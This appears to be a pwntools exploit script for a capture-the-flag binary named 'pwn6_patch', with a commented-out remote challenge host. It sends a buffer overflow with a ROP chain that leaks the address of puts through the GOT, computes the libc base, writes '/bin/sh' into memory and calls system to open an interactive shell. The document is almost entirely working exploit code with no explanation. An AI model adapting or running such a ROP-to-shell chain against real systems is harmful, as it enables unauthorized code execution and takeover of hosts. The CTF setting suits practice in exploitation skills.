from pwn import *
context(arch='amd64',os='linux',log_level='debug')
io = process('./pwn6_patch')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#io = remote('111.33.164.4',50006)
elf = ELF('./pwn6_patch')
io.sendline('1000')
io.recvuntil('OH, WHY ARE YOU SO GOOD?\n')
payload = 'a'*0x18+p64(0x414fc3)+p64(elf.got['puts'])+p64(elf.plt['puts'])
payload += p64(0x414FBA)+p64(0)+p64(1)+p64(elf.got['read'])+p64(0x50)+p64(0x621FE9)+p64(0)
payload += p64(0x414FA0) + p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0x4007C3)
io.sendline(payload)
puts = u64(io.recv(6).ljust(8,'\x00'))
io.recv()
io.sendline('/bin/sh')

libc_base = puts - libc.symbols['puts']
sys_addr = libc_base + libc.symbols['system']
log.success('sys: '+hex(sys_addr))
log.success('base: '+hex(libc_base))
log.success('puts: '+hex(puts))

io.sendline('1000')
io.sendline('a'*0x18+p64(0x414fc3)+p64(0x621FE9)+p64(sys_addr))
io.interactive()


